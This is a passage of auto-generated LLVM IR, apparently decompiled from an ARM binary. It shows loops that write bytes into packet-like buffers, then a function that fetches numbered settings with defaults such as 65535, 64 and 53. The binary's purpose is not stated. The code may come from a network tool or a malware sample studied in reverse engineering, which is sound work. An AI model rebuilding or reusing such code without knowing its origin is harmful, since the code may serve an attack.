  %v2_a764 = load i32, i32* %r4.global-to-local, align 4
  %v3_a764 = add i32 %v2_a764, 2
  %v4_a764 = inttoptr i32 %v3_a764 to i8*
  store i8 %v1_a764, i8* %v4_a764, align 1
  %v0_a768 = load i32, i32* %r2.global-to-local, align 4
  %v1_a768 = trunc i32 %v0_a768 to i8
  %v2_a768 = load i32, i32* %r4.global-to-local, align 4
  %v3_a768 = add i32 %v2_a768, 1
  %v4_a768 = inttoptr i32 %v3_a768 to i8*
  store i8 %v1_a768, i8* %v4_a768, align 1
  store i32 %v4_a76c, i32* %r3.global-to-local, align 4
  %v0_a770 = load i32, i32* %ip.global-to-local, align 4
  %v1_a770 = trunc i32 %v0_a770 to i8
  %v2_a770 = load i32, i32* %r4.global-to-local, align 4
  %v3_a770 = add i32 %v2_a770, 4
  %v4_a770 = inttoptr i32 %v3_a770 to i8*
  store i8 %v1_a770, i8* %v4_a770, align 1
  %v0_a774 = load i32, i32* %r3.global-to-local, align 4
  %v1_a774 = trunc i32 %v0_a774 to i8
  %v2_a774 = load i32, i32* %r4.global-to-local, align 4
  %v3_a774 = add i32 %v2_a774, 3
  %v4_a774 = inttoptr i32 %v3_a774 to i8*
  store i8 %v1_a774, i8* %v4_a774, align 1
  %v0_a778 = load i32, i32* %r8.global-to-local, align 4
  %v0_a77c = load i32, i32* @lr, align 4
  %v1_a77c = add i32 %v0_a77c, 32
  %v3_a780 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a780, i32* %r2.global-to-local, align 4
  %v3_a784 = call i32 @function_11268(i32 %v1_a77c, i32 %v0_a778, i32 %v3_a780)
  %v3_a788 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a788, i32* %r3.global-to-local, align 4
  %v1_a78c = add i32 %v3_a788, 1
  store i32 %v1_a78c, i32* @r4, align 4
  %v1_a790 = load i32, i32* %sb.global-to-local, align 4
  %v9_a790 = icmp eq i32 %v1_a78c, %v1_a790
  store i1 %v9_a790, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a78c, i32* %stack_var_-40, align 4
  %v5_a798 = icmp slt i32 %v1_a78c, %v1_a790
  br i1 %v5_a798, label %dec_label_pc_a670, label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %bb57, %dec_label_pc_a5fc
  %v0_a79c = phi i32 [ %v0_a618, %dec_label_pc_a5fc ], [ %v1_a790, %bb57 ]
  %v2_a79c = icmp eq i32 %v0_a79c, 0
  store i1 %v2_a79c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7e4 = icmp eq i32 %v3_a60c, 65535
  br label %dec_label_pc_a7a4.outer

dec_label_pc_a7a4.outer:                          ; preds = %dec_label_pc_a8b4, %dec_label_pc_a79c
  %v1_a7a4.ph.in = phi i32 [ %v1_a8a8, %dec_label_pc_a8b4 ], [ %v0_a79c, %dec_label_pc_a79c ]
  %v0_a7a4.ph = phi i1 [ %v2_a8b4, %dec_label_pc_a8b4 ], [ %v2_a79c, %dec_label_pc_a79c ]
  %v1_a7a4.ph = icmp slt i32 %v1_a7a4.ph.in, 0
  %v4_a7a4 = or i1 %v1_a7a4.ph, %v0_a7a4.ph
  br label %dec_label_pc_a7a4

dec_label_pc_a7a4:                                ; preds = %dec_label_pc_a7a4.outer, %dec_label_pc_a7a4
  br i1 %v4_a7a4, label %dec_label_pc_a7a4, label %dec_label_pc_a7a8

dec_label_pc_a7a8:                                ; preds = %dec_label_pc_a7a4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_a7b4

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a804, %dec_label_pc_a7a8
  %v1_a7c8 = phi i32 [ %v1_a8a4, %dec_label_pc_a804 ], [ 0, %dec_label_pc_a7a8 ]
  %v5_a7b8 = mul i32 %v1_a7c8, 24
  %v1_a7bc = load i32, i32* @sl, align 4
  %v2_a7bc = add i32 %v1_a7bc, %v5_a7b8
  store i32 %v2_a7bc, i32* %r3.global-to-local, align 4
  %v1_a7c4 = add i32 %v2_a7bc, 20
  %v2_a7c4 = inttoptr i32 %v1_a7c4 to i8*
  %v3_a7c4 = load i8, i8* %v2_a7c4, align 1
  %v4_a7c4 = zext i8 %v3_a7c4 to i32
  store i32 %v4_a7c4, i32* %r2.global-to-local, align 4
  %v4_a7c8 = mul i32 %v1_a7c8, 4
  %v5_a7c8 = add i32 %v4_a7c8, %v2_a4e4
  %v6_a7c8 = inttoptr i32 %v5_a7c8 to i32*
  %v7_a7c8 = load i32, i32* %v6_a7c8, align 4
  store i32 %v7_a7c8, i32* @r5, align 4
  %v7_a7d0 = icmp eq i8 %v3_a7c4, 31
  store i1 %v7_a7d0, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_a7d8 = add i32 %v7_a7c8, 20
  store i32 %v1_a7d8, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_a7c4, 32
  br i1 %tmp61, label %dec_label_pc_a8c0, label %dec_label_pc_a7e0

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7b4
  store i32 %v3_a60c, i32* %r2.global-to-local, align 4
  store i1 %v3_a7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a7e4, label %dec_label_pc_a928, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a8c0.dec_label_pc_a7ec_crit_edge, %dec_label_pc_a7e0
  %v1_a7f0 = phi i32 [ %v1_a7f0.pre, %dec_label_pc_a8c0.dec_label_pc_a7ec_crit_edge ], [ 65535, %dec_label_pc_a7e0 ]
  store i32 %v3_a610, i32* %r3.global-to-local, align 4
  %v9_a7f0 = icmp eq i32 %v3_a610, %v1_a7f0
  store i1 %v9_a7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a7f0, label %dec_label_pc_a944, label %dec_label_pc_a7f8

dec_label_pc_a7f8:                                ; preds = %dec_label_pc_a928.dec_label_pc_a7f8_crit_edge, %dec_label_pc_a7ec
  %v1_a7fc = phi i32 [ %v1_a7fc.pre, %dec_label_pc_a928.dec_label_pc_a7f8_crit_edge ], [ %v1_a7f0, %dec_label_pc_a7ec ]
  %v9_a7fc = icmp eq i32 %v3_a614, %v1_a7fc
  store i1 %v9_a7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a7fc, label %dec_label_pc_a960, label %dec_label_pc_a804

dec_label_pc_a804:                                ; preds = %dec_label_pc_a944, %dec_label_pc_a7f8, %dec_label_pc_a960
  %v0_a808 = load i32, i32* %r8.global-to-local, align 4
  %v1_a808 = trunc i32 %v0_a808 to i8
  %v2_a808 = load i32, i32* @r5, align 4
  %v3_a808 = add i32 %v2_a808, 10
  %v4_a808 = inttoptr i32 %v3_a808 to i8*
  store i8 %v1_a808, i8* %v4_a808, align 1
  %v0_a80c = load i32, i32* %r8.global-to-local, align 4
  %v1_a80c = trunc i32 %v0_a80c to i8
  %v2_a80c = load i32, i32* @r5, align 4
  %v3_a80c = add i32 %v2_a80c, 11
  %v4_a80c = inttoptr i32 %v3_a80c to i8*
  store i8 %v1_a80c, i8* %v4_a80c, align 1
  %v0_a810 = load i32, i32* @r5, align 4
  store i32 %v0_a810, i32* @r0, align 4
  %v2_a814 = call i32 @function_d0b8(i32 %v0_a810, i32 20)
  %v3_a814 = trunc i32 %v2_a814 to i8
  %v4_a818 = sdiv i32 %v2_a814, 256
  store i32 %v4_a818, i32* %r3.global-to-local, align 4
  %v1_a81c = trunc i32 %v4_a818 to i8
  %v2_a81c = load i32, i32* @r5, align 4
  %v3_a81c = add i32 %v2_a81c, 11
  %v4_a81c = inttoptr i32 %v3_a81c to i8*
  store i8 %v1_a81c, i8* %v4_a81c, align 1
  %v3_a820 = load i32, i32* @r5, align 4
  %v4_a820 = add i32 %v3_a820, 10
  %v5_a820 = inttoptr i32 %v4_a820 to i8*
  store i8 %v3_a814, i8* %v5_a820, align 1
  %v0_a824 = load i32, i32* %r8.global-to-local, align 4
  %v1_a824 = trunc i32 %v0_a824 to i8
  %v2_a824 = load i32, i32* @r6, align 4
  %v3_a824 = add i32 %v2_a824, 6
  %v4_a824 = inttoptr i32 %v3_a824 to i8*
  store i8 %v1_a824, i8* %v4_a824, align 1
  %v0_a828 = load i32, i32* %r8.global-to-local, align 4
  %v1_a828 = trunc i32 %v0_a828 to i8
  %v2_a828 = load i32, i32* @r6, align 4
  %v3_a828 = add i32 %v2_a828, 7
  %v4_a828 = inttoptr i32 %v3_a828 to i8*
  store i8 %v1_a828, i8* %v4_a828, align 1
  %v0_a82c = load i32, i32* @r5, align 4
  %v1_a82c = add i32 %v0_a82c, 24
  %v2_a82c = inttoptr i32 %v1_a82c to i8*
  %v3_a82c = load i8, i8* %v2_a82c, align 1
  %v4_a82c = zext i8 %v3_a82c to i32
  store i32 %v4_a82c, i32* %r3.global-to-local, align 4
  %v1_a830 = add i32 %v0_a82c, 25
  %v2_a830 = inttoptr i32 %v1_a830 to i8*
  %v3_a830 = load i8, i8* %v2_a830, align 1
  %v4_a830 = zext i8 %v3_a830 to i32
  %v4_a834 = mul nuw nsw i32 %v4_a830, 256
  %v5_a834 = or i32 %v4_a834, %v4_a82c
  store i32 %v5_a834, i32* %r2.global-to-local, align 4
  %v3_a838 = load i32, i32* %stack_var_-44, align 4
  %v0_a83c = load i32, i32* @r6, align 4
  store i32 %v0_a83c, i32* @r1, align 4
  %v1_a840 = add i32 %v3_a838, 12
  store i32 %v1_a840, i32* %r3.global-to-local, align 4
  %v4_a848 = call i32 @function_d114(i32 %v0_a82c, i32 %v0_a83c, i32 %v5_a834, i32 %v1_a840)
  %v5_a848 = trunc i32 %v4_a848 to i8
  %v4_a84c24 = udiv i32 %v4_a848, 256
  %v1_a850 = trunc i32 %v4_a84c24 to i8
  %v2_a850 = load i32, i32* @r6, align 4
  %v3_a850 = add i32 %v2_a850, 7
  %v4_a850 = inttoptr i32 %v3_a850 to i8*
  store i8 %v1_a850, i8* %v4_a850, align 1
  %v3_a854 = load i32, i32* @r6, align 4
  %v4_a854 = add i32 %v3_a854, 6
  %v5_a854 = inttoptr i32 %v4_a854 to i8*
  store i8 %v5_a848, i8* %v5_a854, align 1
  %v3_a858 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a858, i32* %r3.global-to-local, align 4
  %v0_a85c = load i32, i32* @r5, align 4
  %v1_a85c = add i32 %v0_a85c, 20
  %v2_a85c = inttoptr i32 %v1_a85c to i32*
  %v3_a85c = load i32, i32* %v2_a85c, align 4
  %v5_a864 = mul i32 %v3_a858, 24
  %v1_a868 = load i32, i32* @sl, align 4
  %v2_a868 = add i32 %v1_a868, %v5_a864
  store i32 %v2_a868, i32* %ip.global-to-local, align 4
  %v3_a86c = udiv i32 %v3_a85c, 65536
  store i32 %v3_a86c, i32* %r2.global-to-local, align 4
  %v1_a870 = trunc i32 %v3_a86c to i8
  %v3_a870 = add i32 %v2_a868, 2
  %v4_a870 = inttoptr i32 %v3_a870 to i8*
  store i8 %v1_a870, i8* %v4_a870, align 1
  %v0_a874 = load i32, i32* %r2.global-to-local, align 4
  %v3_a87425 = udiv i32 %v0_a874, 256
  %v3_a878 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a878, i32* %r2.global-to-local, align 4
  %v1_a87c = trunc i32 %v3_a87425 to i8
  %v2_a87c = load i32, i32* %ip.global-to-local, align 4
  %v3_a87c = add i32 %v2_a87c, 3
  %v4_a87c = inttoptr i32 %v3_a87c to i8*
  store i8 %v1_a87c, i8* %v4_a87c, align 1
  %v0_a880 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a888 = load i32, i32* %r2.global-to-local, align 4
  %v1_a888 = add i32 %v0_a888, 32
  store i32 %v1_a888, i32* %r2.global-to-local, align 4
  %v0_a88c = load i32, i32* %fp.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_a894 = load i32, i32* %ip.global-to-local, align 4
  %v6_a89c = inttoptr i32 %v0_a880 to i32*
  %v7_a89c = call i32 @function_1237c(i32 %v0_a88c, i32* %v6_a89c, i32 %v1_a888, i32 16384, i32 %v0_a894, i32 16)
  %v3_a8a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a8a0, i32* %r3.global-to-local, align 4
  %v1_a8a4 = add i32 %v3_a8a0, 1
  %v1_a8a8 = load i32, i32* %sb.global-to-local, align 4
  %v9_a8a8 = icmp eq i32 %v1_a8a4, %v1_a8a8
  store i1 %v9_a8a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a8a4, i32* %stack_var_-40, align 4
  %v5_a8b0 = icmp slt i32 %v1_a8a4, %v1_a8a8
  br i1 %v5_a8b0, label %dec_label_pc_a7b4, label %dec_label_pc_a8b4

dec_label_pc_a8b4:                                ; preds = %dec_label_pc_a804
  %v2_a8b4 = icmp eq i32 %v1_a8a8, 0
  store i1 %v2_a8b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a7a4.outer

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a7b4
  %v1_a8c0 = add i32 %v2_a7bc, 16
  %v2_a8c0 = inttoptr i32 %v1_a8c0 to i32*
  %v3_a8c0 = load i32, i32* %v2_a8c0, align 4
  store i32 %v3_a8c0, i32* @r4, align 4
  %v0_a8c4 = call i32 @function_e978()
  %v3_a8c8 = load i32, i32* %stack_var_-40, align 4
  %v5_a8d0 = mul i32 %v3_a8c8, 24
  %v0_a8d4 = load i32, i32* @r4, align 4
  %v1_a8d8 = and i32 %v0_a8d4, 65280
  store i32 %v1_a8d8, i32* %r3.global-to-local, align 4
  %v1_a8d4 = udiv i32 %v0_a8d4, 256
  %v3_a8dc = and i32 %v1_a8d4, 65280
  store i32 %v3_a8dc, i32* %r2.global-to-local, align 4
  %v1_a8e0 = load i32, i32* @sl, align 4
  %v2_a8e0 = add i32 %v1_a8e0, %v5_a8d0
  store i32 %v2_a8e0, i32* %ip.global-to-local, align 4
  %v1_a8ec = add i32 %v2_a8e0, 20
  %v2_a8ec = inttoptr i32 %v1_a8ec to i8*
  %v3_a8ec = load i8, i8* %v2_a8ec, align 1
  %v4_a8ec = zext i8 %v3_a8ec to i32
  %v2_a8f4 = call i32 @llvm.bswap.i32(i32 %v0_a8d4)
  %v7_a8f8 = lshr i32 %v0_a8c4, %v4_a8ec
  %v8_a8f8 = add i32 %v7_a8f8, %v2_a8f4
  store i32 %v3_a60c, i32* %r2.global-to-local, align 4
  %v2_a918 = call i32 @llvm.bswap.i32(i32 %v8_a8f8)
  store i32 %v2_a918, i32* %r3.global-to-local, align 4
  %v1_a91c = load i32, i32* %r7.global-to-local, align 4
  %v9_a91c = icmp eq i32 %v3_a60c, %v1_a91c
  store i1 %v9_a91c, i1* %cpsr_z.global-to-local, align 1
  %v1_a920 = load i32, i32* @r5, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v2_a918, i32* %v3_a920, align 4
  br i1 %v9_a91c, label %dec_label_pc_a928, label %dec_label_pc_a8c0.dec_label_pc_a7ec_crit_edge

dec_label_pc_a8c0.dec_label_pc_a7ec_crit_edge:    ; preds = %dec_label_pc_a8c0
  %v1_a7f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_a7ec

dec_label_pc_a928:                                ; preds = %dec_label_pc_a8c0, %dec_label_pc_a7e0
  %v0_a928 = call i32 @function_e978()
  %v1_a928 = trunc i32 %v0_a928 to i8
  %v4_a92c26 = udiv i32 %v0_a928, 256
  %v1_a930 = trunc i32 %v4_a92c26 to i8
  %v2_a930 = load i32, i32* @r5, align 4
  %v3_a930 = add i32 %v2_a930, 5
  %v4_a930 = inttoptr i32 %v3_a930 to i8*
  store i8 %v1_a930, i8* %v4_a930, align 1
  store i32 %v3_a610, i32* %r3.global-to-local, align 4
  %v1_a938 = load i32, i32* %r7.global-to-local, align 4
  %v9_a938 = icmp eq i32 %v3_a610, %v1_a938
  store i1 %v9_a938, i1* %cpsr_z.global-to-local, align 1
  %v3_a93c = load i32, i32* @r5, align 4
  %v4_a93c = add i32 %v3_a93c, 4
  %v5_a93c = inttoptr i32 %v4_a93c to i8*
  store i8 %v1_a928, i8* %v5_a93c, align 1
  %v0_a940 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a940, label %dec_label_pc_a944, label %dec_label_pc_a928.dec_label_pc_a7f8_crit_edge

dec_label_pc_a928.dec_label_pc_a7f8_crit_edge:    ; preds = %dec_label_pc_a928
  %v1_a7fc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_a7f8

dec_label_pc_a944:                                ; preds = %dec_label_pc_a928, %dec_label_pc_a7ec
  %v0_a944 = call i32 @function_e978()
  %v1_a944 = trunc i32 %v0_a944 to i8
  %v4_a94c = sdiv i32 %v0_a944, 256
  store i32 %v4_a94c, i32* %r3.global-to-local, align 4
  %v1_a950 = load i32, i32* %r7.global-to-local, align 4
  %v9_a950 = icmp eq i32 %v3_a614, %v1_a950
  store i1 %v9_a950, i1* %cpsr_z.global-to-local, align 1
  %v3_a954 = load i32, i32* @r5, align 4
  %v4_a954 = add i32 %v3_a954, 20
  %v5_a954 = inttoptr i32 %v4_a954 to i8*
  store i8 %v1_a944, i8* %v5_a954, align 1
  %v0_a958 = load i32, i32* %r3.global-to-local, align 4
  %v1_a958 = trunc i32 %v0_a958 to i8
  %v2_a958 = load i32, i32* @r6, align 4
  %v3_a958 = add i32 %v2_a958, 1
  %v4_a958 = inttoptr i32 %v3_a958 to i8*
  store i8 %v1_a958, i8* %v4_a958, align 1
  %v0_a95c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a95c, label %dec_label_pc_a960, label %dec_label_pc_a804

dec_label_pc_a960:                                ; preds = %dec_label_pc_a944, %dec_label_pc_a7f8
  %v0_a960 = call i32 @function_e978()
  %v1_a960 = trunc i32 %v0_a960 to i8
  %v4_a964 = sdiv i32 %v0_a960, 256
  store i32 %v4_a964, i32* %r3.global-to-local, align 4
  %v1_a968 = trunc i32 %v4_a964 to i8
  %v2_a968 = load i32, i32* @r6, align 4
  %v3_a968 = add i32 %v2_a968, 3
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v1_a968, i8* %v4_a968, align 1
  %v3_a96c = load i32, i32* @r6, align 4
  %v4_a96c = add i32 %v3_a96c, 2
  %v5_a96c = inttoptr i32 %v4_a96c to i8*
  store i8 %v1_a960, i8* %v5_a96c, align 1
  br label %dec_label_pc_a804

dec_label_pc_a974:                                ; preds = %dec_label_pc_a5d4
  %v0_a974 = load i32, i32* %fp.global-to-local, align 4
  %v1_a978 = call i32 @function_11af0(i32 %v0_a974)
  br label %dec_label_pc_a97c

dec_label_pc_a97c:                                ; preds = %dec_label_pc_a4c4, %dec_label_pc_a974
  %v29_a980 = phi i32 [ %v3_a5c4, %dec_label_pc_a4c4 ], [ %v1_a978, %dec_label_pc_a974 ]
  store i32 %v3_a4c4, i32* %r4.global-to-local, align 4
  store i32 %v12_a4c4, i32* %r7.global-to-local, align 4
  ret i32 %v29_a980

; uselistorder directives
  uselistorder i32 %v4_a964, { 1, 0 }
  uselistorder i32 %v2_a918, { 1, 0 }
  uselistorder i32 %v0_a8d4, { 1, 0, 2 }
  uselistorder i1 %v2_a8b4, { 1, 0 }
  uselistorder i32 %v1_a8a8, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a8a4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_a86c, { 1, 0 }
  uselistorder i32 %v4_a818, { 1, 0 }
  uselistorder i1 %v3_a7e4, { 1, 0 }
  uselistorder i32 %v1_a78c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a730, { 1, 0 }
  uselistorder i32 %v1_a6b8, { 1, 0 }
  uselistorder i32 %v1_a638, { 1, 0 }
  uselistorder i32 %v1_a634, { 1, 0 }
  uselistorder i32 %v0_a604, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_a5fc, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_a5f4, { 1, 0 }
  uselistorder i1 %v7_a5c8, { 1, 0 }
  uselistorder i32 %v3_a5c4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a564, { 1, 0 }
  uselistorder i8 %v5_a554, { 1, 0 }
  uselistorder i32 %v5_a538, { 1, 0 }
  uselistorder i32 %v6_a4fc, { 1, 0 }
  uselistorder i32 %v1_a4c8, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 0, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_a97c, { 1, 0 }
  uselistorder label %dec_label_pc_a804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a7a4, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_a988(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a988:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_a988 = load i32, i32* @r4, align 4
  %v15_a988 = load i32, i32* @r8, align 4
  %v18_a988 = load i32, i32* @sb, align 4
  %v21_a988 = load i32, i32* @sl, align 4
  %v24_a988 = load i32, i32* @fp, align 4
  %v1_a994 = urem i32 %arg1, 256
  store i32 %v1_a994, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a9a0 = urem i32 %arg3, 256
  store i32 %v1_a9a0, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_a9ac = call i32 @function_126cc(i32 %v1_a994, i32 4)
  %v0_a9b0 = load i32, i32* @r5, align 4
  store i32 %v0_a9b0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a9bc = load i32, i32* @r4, align 4
  store i32 %v0_a9bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a9c4 = inttoptr i32 %v0_a9b0 to i32*
  %v6_a9c4 = call i32 @function_85e0(i32 %v0_a9bc, i32* %v5_a9c4, i32 2, i32 0)
  %v1_a9d0 = urem i32 %v6_a9c4, 256
  store i32 %v1_a9d0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a9dc = load i32, i32* @r4, align 4
  store i32 %v0_a9dc, i32* %r0.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r5, align 4
  store i32 %v0_a9e0, i32* %r1.global-to-local, align 4
  %v5_a9e4 = trunc i32 %v6_a9c4 to i8
  %v6_a9e8 = inttoptr i32 %v0_a9e0 to i32*
  %v7_a9e8 = call i32 @function_85e0(i32 %v0_a9dc, i32* %v6_a9e8, i32 3, i32 65535)
  %v0_a9ec = load i32, i32* @r5, align 4
  store i32 %v0_a9ec, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_aa00 = inttoptr i32 %v0_a9ec to i32*
  %v6_aa00 = call i32 @function_85e0(i32 %v0_a9f8, i32* %v5_aa00, i32 4, i32 64)
  %v1_aa08 = urem i32 %v6_aa00, 256
  store i32 %v1_aa08, i32* %ip.global-to-local, align 4
  %v0_aa0c = load i32, i32* @r5, align 4
  store i32 %v0_aa0c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_aa18 = load i32, i32* @r4, align 4
  store i32 %v0_aa18, i32* %r0.global-to-local, align 4
  %v6_aa20 = inttoptr i32 %v0_aa0c to i32*
  %v7_aa20 = call i32 @function_85e0(i32 %v0_aa18, i32* %v6_aa20, i32 5, i32 0)
  %v1_aa2c = urem i32 %v7_aa20, 256
  store i32 %v1_aa2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_aa38 = load i32, i32* @r4, align 4
  store i32 %v0_aa38, i32* %r0.global-to-local, align 4
  %v0_aa3c = load i32, i32* @r5, align 4
  store i32 %v0_aa3c, i32* %r1.global-to-local, align 4
  %v5_aa44 = inttoptr i32 %v0_aa3c to i32*
  %v6_aa44 = call i32 @function_85e0(i32 %v0_aa38, i32* %v5_aa44, i32 6, i32 65535)
  %v0_aa48 = load i32, i32* @r5, align 4
  store i32 %v0_aa48, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_aa44, i32* %fp.global-to-local, align 4
  %v0_aa58 = load i32, i32* @r4, align 4
  store i32 %v0_aa58, i32* %r0.global-to-local, align 4
  %v4_aa5c = inttoptr i32 %v0_aa48 to i32*
  %v5_aa5c = call i32 @function_85e0(i32 %v0_aa58, i32* %v4_aa5c, i32 7, i32 53)
  %v0_aa64 = load i32, i32* @r5, align 4
  store i32 %v0_aa64, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_aa5c, i32* %sb.global-to-local, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r0.global-to-local, align 4
  %v4_aa78 = inttoptr i32 %v0_aa64 to i32*
  %v5_aa78 = call i32 @function_85e0(i32 %v0_aa74, i32* %v4_aa78, i32 9, i32 65535)
  %v0_aa7c = load i32, i32* @r5, align 4
  store i32 %v0_aa7c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_aa78, i32* @sl, align 4
  %v0_aa8c = load i32, i32* @r4, align 4
  store i32 %v0_aa8c, i32* %r0.global-to-local, align 4
  %v4_aa90 = inttoptr i32 %v0_aa7c to i32*
  %v5_aa90 = call i32 @function_85e0(i32 %v0_aa8c, i32* %v4_aa90, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r5, align 4
  store i32 %v0_aa9c, i32* %r1.global-to-local, align 4
  store i32 %v5_aa90, i32* %r8.global-to-local, align 4
  %v0_aaa4 = load i32, i32* @r4, align 4
  store i32 %v0_aaa4, i32* %r0.global-to-local, align 4
  %v4_aaa8 = inttoptr i32 %v0_aa9c to i32*
  %v5_aaa8 = call i32 @function_81cc(i32 %v0_aaa4, i32* %v4_aaa8, i32 8, i32 0)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_aab4 = call i32 @function_10c20(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_aac0 = call i32 @function_10b3c(i32 21, i32* null)
  store i32 %v3_aac0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_aac8 = inttoptr i32 %v3_aac0 to i8*
  %v3_aac8 = call i32 @function_11c1c(i8* %v2_aac8, i32 0)
  store i32 %v3_aac8, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_aad4 = call i32 @function_10b68(i32 21)
  store i32 %v1_aad4, i32* %r0.global-to-local, align 4
  %v0_aad8 = load i32, i32* @r4, align 4
  %v1_aad8 = icmp slt i32 %v0_aad8, 0
  %v2_aad8 = icmp eq i32 %v0_aad8, 0
  store i1 %v2_aad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_aad8, label %dec_label_pc_b0a4, label %dec_label_pc_aae0

dec_label_pc_aae0:                                ; preds = %dec_label_pc_a988
  %v2_aae4 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_aae4, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
